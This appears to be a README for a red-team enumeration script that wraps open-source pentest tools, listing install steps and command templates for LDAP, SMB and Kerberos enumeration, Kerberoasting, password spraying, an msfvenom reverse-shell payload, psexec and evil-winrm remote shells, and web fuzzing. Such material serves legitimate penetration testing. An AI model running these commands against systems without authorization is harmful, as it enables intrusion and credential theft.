# Red Team Enumeration Script

## Overview

The `enum_script.py` automates various enumeration tasks, leveraging a range of open-source tools. It simplifies reconnaissance and enumeration by integrating commands for SMB, LDAP, Kerberos, Nmap scanning, web fuzzing, and more.

## Installation

### **1. Clone the Repository**

```bash
git clone https://github.com/john5652/redteam.git
cd redteam
```

### **2. Install Python Dependencies**

```bash
pip install -r requirements.txt
```

### **3. Install External Tools**

Ensure the following tools are installed:

```bash
sudo apt update && sudo apt install -y \
    ldap-utils \
    impacket-scripts \
    smbclient \
    enum4linux \
    gobuster \
    ffuf \
    nikto \
    nmap \
    smbmap \
    kerbrute \
    crackmapexec \
    ligolo \
    snmp \
    cewl \
    bloodhound
```

## Usage

Run the script interactively:

```bash
python3 enum_script.py
```

Follow the prompts to select the enumeration option.

## Options and Dependencies

Below is a breakdown of each function, its purpose, and required tools:

### **1. LDAP Search**

- **Command:** `ldapsearch -x -H ldap://<domain>`
- **Tool:** `ldap-utils`
- **Description:** Queries LDAP for user and group information.

### **2. Windapsearch**

- **Command:** `python3 /home/kali/Tools/windapsearch/windapsearch.py -d <domain>`
- **Tool:** `windapsearch`
- **Description:** Enumerates LDAP details using Windapsearch.

### **3. GetUserSPNs (Kerberos)**

- **Command:** `impacket-GetUserSPNs -request <domain>`
- **Tool:** `impacket-scripts`
- **Description:** Enumerates Kerberos service accounts.

### **4. GetNPUsers (AS-REP Roasting)**

- **Command:** `impacket-GetNPUsers <domain> -no-pass`
- **Tool:** `impacket-scripts`
- **Description:** Enumerates Kerberos accounts that do not require pre-authentication.

### **5. RPC Anonymous Connect**

- **Command:** `rpcclient -U "" <target-ip>`
- **Tool:** `rpcbind`
- **Description:** Tests anonymous RPC connection.

### **6. SMB Anonymous Listing**

- **Command:** `smbclient -L <ip> -N`
- **Tool:** `smbclient`
- **Description:** Lists available SMB shares anonymously.

### **7. NBTSCan**

- **Command:** `nbtscan <target-ip>`
- **Tool:** `nbtscan`
- **Description:** Scans for NetBIOS names and shares.

### **8. Nikto Scan**

- **Command:** `nikto -h <target-url>`
- **Tool:** `nikto`
- **Description:** Scans web servers for known vulnerabilities.

### **9. Nmap Scan**

- **Command:** `nmap <options> <target-ip>`
- **Tool:** `nmap`
- **Description:** Performs network enumeration.

### **10. SMBMap Scan**

- **Command:** `smbmap -H <target-ip>`
- **Tool:** `smbmap`
- **Description:** Enumerates SMB shares.

### **11. BloodHound Data Collection**

- **Command:** `python3 /home/kali/Tools/BloodHound.py/bloodhound.py -d <domain>`
- **Tool:** `BloodHound`
- **Description:** Collects Active Directory enumeration data.

### **12. Kerbrute Password Spray**

- **Command:** `kerbrute passwordspray -d <domain> <wordlist>`
- **Tool:** `kerbrute`
- **Description:** Performs Kerberos password spraying.

### **13. CrackMapExec Password Spray**

- **Command:** `crackmapexec smb <target-ip> -u <users> -p <passwords>`
- **Tool:** `crackmapexec`
- **Description:** Tests credentials across SMB services.

### **14. Ligolo Setup**

- **Command:** `ligolo-proxy -selfcert -laddr 0.0.0.0:<port>`
- **Tool:** `ligolo`
- **Description:** Sets up Ligolo tunneling.

### **15. Create Reverse Shell**

- **Command:** `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe`
- **Tool:** `msfvenom`
- **Description:** Generates a reverse shell payload.

### **16. Impacket psexec**

- **Command:** `impacket-psexec <domain>/<user>:<pass>@<target-ip>`
- **Tool:** `impacket-scripts`
- **Description:** Executes commands on remote Windows systems using SMB.

### **17. Evil-WinRM**

- **Command:** `evil-winrm -i <target-ip> -u <user> -p <pass>`
- **Tool:** `evil-winrm`
- **Description:** Provides an interactive WinRM shell.

### **18. Gobuster Directory Enumeration**

- **Command:** `gobuster dir -u <target-url> -w <wordlist>`
- **Tool:** `gobuster`
- **Description:** Performs directory brute-forcing.

### **19. FFUF Web Fuzzing**

- **Command:** `ffuf -u <target-url>/FUZZ -w <wordlist>`
- **Tool:** `ffuf`
- **Description:** Fuzzes web applications for hidden paths and parameters.

### **20. SNMP Walk**

- **Command:** `snmpwalk -v1 -c public <target-ip>`
- **Tool:** `snmp`
- **Description:** Queries SNMP-enabled devices for information.

### **21. Cewl Wordlist Creation**

- **Command:** `cewl -w <wordlist.txt> <target-url>`
- **Tool:** `cewl`
- **Description:** Generates a wordlist from website content.

## Contributing

Contributions are welcome! Fork the repository and submit a pull request.

## License

This project is licensed under the MIT License.


